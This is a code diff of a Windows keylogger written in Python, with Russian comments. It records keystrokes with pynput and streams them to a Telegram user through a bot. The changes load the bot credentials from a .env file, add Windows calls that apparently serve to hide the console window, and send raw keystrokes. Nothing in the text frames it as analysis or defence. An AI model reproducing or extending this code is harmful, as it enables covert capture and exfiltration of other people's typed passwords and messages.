@@ -1,5 +1,5 @@
 import ctypes
-import json
+import os
 import sys
 import threading
 import time
@@ -7,12 +7,19 @@ from ctypes import wintypes
 from queue import Empty, Queue
 from typing import Optional
 
+from dotenv import load_dotenv
 import telebot
 from pynput import keyboard
 
-# Настройте эти параметры один раз перед запуском.
-BOT_TOKEN = "YOUR_SERVER_BOT_TOKEN"
-TARGET_USER_ID = "123456789"  # ваш Telegram user ID
+load_dotenv()
+
+BOT_TOKEN = os.getenv("LOGGER_BOT_TOKEN", "")
+TARGET_USER_ID = os.getenv("LOGGER_TARGET_USER_ID", "")
+
+if not BOT_TOKEN or not TARGET_USER_ID:
+    raise RuntimeError(
+        "Заполните LOGGER_BOT_TOKEN и LOGGER_TARGET_USER_ID в .env перед запуском"
+    )
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
 stop_event = threading.Event()
@@ -44,6 +51,7 @@ _user32 = None
 _kernel32 = None
 if sys.platform == "win32":
     _user32 = ctypes.WinDLL("user32", use_last_error=True)
+    _kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
     _user32.GetForegroundWindow.restype = wintypes.HWND
     _user32.GetForegroundWindow.argtypes = []
     _user32.GetWindowThreadProcessId.restype = wintypes.DWORD
@@ -66,6 +74,10 @@ if sys.platform == "win32":
         wintypes.UINT,
         wintypes.HKL,
     ]
+    _kernel32.GetConsoleWindow.restype = wintypes.HWND
+    _kernel32.GetConsoleWindow.argtypes = []
+    _user32.ShowWindow.restype = wintypes.BOOL
+    _user32.ShowWindow.argtypes = [wintypes.HWND, ctypes.c_int]
 
 
 def _get_active_keyboard_layout() -> wintypes.HKL:
@@ -222,18 +234,14 @@ def key_to_str(key):
         keyboard.Key.ctrl_r,
     }:
         return None
-    if key == keyboard.Key.caps_lock:
-        return "{caps_lock}"
     if key == keyboard.Key.enter:
-        return "{return}"
+        return "\n"
     if key == keyboard.Key.backspace:
-        return "{backspace}"
+        return "\b"
     if key == keyboard.Key.tab:
-        return "{tab}"
+        return "\t"
     if key == keyboard.Key.space:
         return " "
-    if key == keyboard.Key.esc:
-        return "{escape}"
     if isinstance(key, keyboard.KeyCode):
         translated = _translate_keycode_windows(key)
         if translated:
@@ -279,8 +287,7 @@ def on_press(key):
     key_str = key_to_str(key)
     if key_str is None:
         return True
-    payload = json.dumps({"type": "key", "key": key_str, "ts": time.time()})
-    send_queue.put(payload)
+    send_queue.put(key_str)
     return True
 
 
